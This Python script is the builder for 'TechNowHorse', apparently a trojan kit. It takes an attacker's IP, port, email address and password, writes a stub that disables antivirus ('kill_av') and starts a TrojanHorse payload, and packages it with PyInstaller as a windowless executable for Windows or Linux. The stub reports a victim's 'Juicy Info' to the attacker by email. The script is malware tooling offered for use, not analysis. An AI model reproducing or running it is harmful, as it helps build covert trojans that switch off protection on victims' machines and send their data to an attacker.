#!/usr/bin/env python

import argparse
import subprocess
import base64
import pyfiglet

PYTHON_PYINSTALLER_PATH = "C:/Python37-32/Scripts/pyinstaller.exe"

def get_options():
    parser = argparse.ArgumentParser(description='TechnowHorse v1.1')
    parser._optionals.title = "Optional Arguments"
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')

    required_arguments = parser.add_argument_group('Required Arguments')
    required_arguments.add_argument("--ip", dest="ip", help="Email address to send reports to.")
    required_arguments.add_argument("--port", dest="port", help="Port of the IP Address given in the --ip argument.")
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send \'TrojanHorse Started\' Notification with other Juicy Info.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--output", dest="output", help="Output file name.", required=True)
    return parser.parse_args()

def create_trojan(file_name, email, password, ip, port):    
    with open(file_name, "w+") as file:
        file.write("import payload\n")
        file.write(f"technowHorse = payload.TrojanHorse(\'{email}\', \'{password}\', \'{ip}\', {port})\n")
        file.write("technowHorse.kill_av()\n")        
        file.write("technowHorse.start()\n")
        
def compile_for_windows(file_name):
    subprocess.call([PYTHON_PYINSTALLER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

ascii_banner = pyfiglet.figlet_format("TechNowHorse")
print(ascii_banner)
print("\t\tAuthor: Pushpender | Website: technowlogy.tk\n")
  
arguments = get_options()
create_trojan(arguments.output, arguments.email, arguments.password, arguments.ip, arguments.port)

if arguments.windows:
    compile_for_windows(arguments.output)

if arguments.linux:
    compile_for_linux(arguments.output)

print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
    
